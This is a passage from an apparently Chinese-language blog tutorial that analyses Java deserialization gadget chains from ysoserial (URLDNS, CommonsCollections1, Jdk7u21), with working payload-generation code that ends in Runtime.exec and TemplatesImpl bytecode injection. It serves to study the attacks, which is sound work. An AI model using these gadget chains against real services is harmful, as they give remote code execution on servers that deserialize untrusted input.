&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 读取写入的 payload 并进行反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h1><div class="note primary flat"><p>建议將 <a href="https://github.com/frohoff/ysoserial">frohoff&#x2F;ysoserial</a> 克隆下来本地调试，这里也只是翻查了一下利用链而已。</p></div><p>Java 反序列化 RCE 三要素：readobject 利用点、利用链、RCE 触发点</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><blockquote><p>URL 类的对象在比较时会进行 DNS 查询，HashMap 反序列化时会对 key 进行哈希和比较<br>将 URL 类对象作为 HashMap 的 key，同时将其 url 设置为可以查询 DNSLOG 地址，将 HashMap 发送到目标服务器，当服务器反序列该数据时将触发 DNS 查询。</p></blockquote><p>不依赖任何第三方库，可以用于确认 <code>readObject</code> 反序列化利用点存在</p><p>URL 类在比较时（<code>equals</code>、<code>hashCode</code>）会进行 DNS 查询，当两个主机名解析到同一个 ip 时认为它们相等。</p><p>利用链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() <span class="comment"># k-v 结构</span></span><br><span class="line">  HashMap.putVal()   <span class="comment"># java.util.HashMap#readObject 反序列化中调用，参数为 hash(key)</span></span><br><span class="line">    HashMap.<span class="built_in">hash</span>()   <span class="comment"># 计算 key 的哈希值，调用 java.net.URL#hashCode</span></span><br><span class="line">      URL.hashCode() <span class="comment"># 当 hashCode 为 -1 时，调用 java.net.URLStreamHandler#hashCode，内部再调用 getHostAddress </span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/TkyD5gURHJzx4lG.png" ><p>POC 示例</p><ul><li>将 URL 对象作为 HashMap 的 key，反序列化时触发 DNS 查询</li><li>URL 类会缓存 <code>hashCode</code> 的执行结果，存储在一个非 transient 的实例变量中，序列化时写入<ul><li>因此在把 URL 添加到 HashMap 前要重置缓存值（利用反射）</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 0x01.生成 payload</span></span><br><span class="line">        <span class="comment">// 设置一个 hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置可以接收 DNS 查询的地址</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将 URL 的 hashCode 字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. 设置 url 的 hashCode 字段为 0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);  <span class="comment">// 默认为 -1 会触发 DNS 查询，因此修改后 hashMap.put 中就不触发</span></span><br><span class="line">        <span class="comment">// 2. 将 url 放入 hashMap 中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        <span class="comment">// 修改 url 的 hashCode 字段为 -1，触发 DNS 查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x02.写入文件模拟网络传输</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x03.读取文件，进行反序列化触发 payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.URLDNS 使用 URL 类对象和 url 值作为 HashMap 对象的 key-value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.URLDNS.SilentURLStreamHandler 避免在生成 payload 时触发 DNS 查询，返回为空</p><ul><li>规避 DNSLOG</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><blockquote><p>利用 ChainedTransformer 构造恶意调用链<br>放在特性和 TransformedMap 相同的 lazyMap 中<br>通过动态代理 AnnotationInvocationHandler 的反序列化触发</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1 ~ 3.2.1</li><li>jdk1.8 之前</li></ul><p>利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/O45lTtijsKYwng6.jpg" ><p>ysoserial.payloads.CommonsCollections1 构造 <code>ChainedTransformer</code>（RCE 指令），然后封装到 lazyMap 中。动态代理 AnnotationInvocationHandler 反序列化时会对成员变量 <code>memberValues</code> （代理对象）调用 <code>entrySet</code> 方法，即调用对应 handler 的 invoke 方法，因此用 lazyMap 构造代理。然后会调用 lazyMap 的 handler，也即调用赋值给其 <code>factory</code> 方法的 ChainedTransformer，实现 RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 lazyMap 对象</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">// transformerChain 赋值给 lazyMap 的 factory 变量</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态代理</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 Map 传入 InvocationHandler 成员变量 memberValues</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="jdk-1-7u21"><a href="#jdk-1-7u21" class="headerlink" title="jdk 1.7u21"></a>jdk 1.7u21</h2><blockquote><p>涉及哈希碰撞和 TemplatesImpl<br>TemplatesImpl 承载恶意调用链，可作为其他 gadget 的“后半”部分</p></blockquote><p>不依赖第三方库，JDK 本身实现的反序列化操作存在安全漏洞。</p><p>fix：AnnotationInvocationHandler 的 <code>readObject</code> 方法增加了异常抛出，之前是直接 return。</p><ul><li>HashMap 构造的 AnnotationInvocationHandler 和 TemplatesImpl 可以存储在 LinkedHashSet 中，在反序列化时通过哈希碰撞（<code>hashCode(f5a5a608)=0</code>）执行下一步；</li><li>在代理对象上调用 <code>equals()</code>，即调用 AnnotationInvocationHandler 的 <code>equalsImpl()</code>，它会 invoke TemplatesImpl 的所有非零参方法，包括 <code>getOutputProperties()</code>；</li><li>上面的步骤会使用 TemplatesImpl 中序列化的恶意字节数组 <code>_bytecodes</code> 作为参数，调用 <code>ClassLoader.declareClass()</code>，最终实现任意代码执行。</li></ul><p>反序列化对象图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet</span><br><span class="line">     |  |</span><br><span class="line">     |  `--&gt; Proxy (Templates) </span><br><span class="line">     |         |</span><br><span class="line">     |         `--&gt; AnnotationInvocationHandler </span><br><span class="line">     |                      |</span><br><span class="line">     |                      `--&gt; HashMap</span><br><span class="line">     |                            |  |</span><br><span class="line">     |                            |  `----&gt; String (&quot;f5a5a608&quot;)</span><br><span class="line">     |                            |</span><br><span class="line">     `-----&gt; TemplatesImpl &lt;------`</span><br><span class="line">                  |</span><br><span class="line">                  `-------&gt; byte[] (malicious class definition)</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/oXL5farBdAERI1F.jpg" ><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.Jdk7u21</p><p>LinkedHashSet （继承 HashMap 实现）调用 <code>writeObject()</code> 方法序列化时，会依次调用每个元素的 <code>writeObject()</code> ，反序列化时会依次调用每个元素的 <code>readObject()</code> 方法，然后将其作为 key 放入 HashMap 中。</p><p>HashMap 中添加元素会调用已有元素的 key 作为参数，调用插入元素的 <code>equals()</code> 方法进行比较。因此只要让反序列化时先添加代理对象，再添加恶意代码实例即可。</p><p>普通对象调用 <code>hashCode()</code> 比较，代理对象 AnnotationInvocationHandler 通过 invoke 调用 <code>hashCode</code> ，内部调用 <code>hashCodeImpl()</code>，而其对 memberValues 循环调用 <code>memberValueHashCode()</code>，当其中的对象不是数组时，返回 <code>hashCode</code>。</p><p>为了让 AnnotationInvocationHandler 代理的对象的返回值与普通对象的返回值相等，这就要求 memberValues  中只有一个值，因此只放一个 key 为 <code>f5a5a608</code>，value 为包含恶意代码的 templates 。</p><ul><li>这里是为了能够执行 equals 然后触发 <code>TemplatesImpl.getOutputProperties</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 恶意代码</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 哈希碰撞值</span></span><br><span class="line"><span class="type">String</span> <span class="variable">zeroHashCodeStr</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>); <span class="comment">// value 任意值，让 LinkedHashSet.add 成功</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 HashMap 创建 AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">    <span class="comment">// 设置为 Templates 类型</span></span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 创建 Templates 代理接口</span></span><br><span class="line"><span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 继承 HashSet</span></span><br><span class="line"><span class="type">LinkedHashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>(); <span class="comment">// maintain order</span></span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(proxy); <span class="comment">// 进行一次比较，如果一开始放的 templates 无法添加 proxy</span></span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 放入实际的 value（替换）</span></span><br><span class="line">map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.util.Gadgets 使用 javaassist 库创建包含恶意代码的类，恶意代码可以在无参构造函数或 static block 中，将恶意代码添加到 TemplatesImpl 的 <code>_bytecodes</code> 变量中，等反序列化时调用 <code>getOutputProperties()</code> 或 <code>newTransformer()</code> 触发恶意代码执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd); <span class="comment">// 创建 static block</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">   clazz.setSuperclass(superC);</span><br><span 